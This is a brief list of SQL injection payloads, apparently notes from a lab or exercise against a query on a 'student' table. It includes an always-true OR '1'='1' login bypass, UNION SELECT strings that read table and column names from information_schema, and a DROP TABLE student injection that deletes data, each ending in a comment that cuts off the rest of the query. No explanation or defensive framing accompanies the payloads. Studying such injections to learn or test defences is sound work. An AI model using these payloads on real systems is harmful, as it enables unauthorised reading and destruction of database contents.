select ? from ? where ? = '162268' ; -- and ? = '';
--' OR '1'='1   
select ? from ? where ? = '162268' union (SELECT TABLE_NAME,TABLE_SCHEMA,3,4,5 FROM information_schema.tables) ; -- and ? = '';
select ? from ? where ? = '162268' union (SELECT COLUMN_NAME,2,3,4,5 FROM information_schema.columns where TABLE_NAME = 'student') ; -- and ? = '';
select ? from ? where ? = '162268' DROP TABLE student ; -- and ? = '';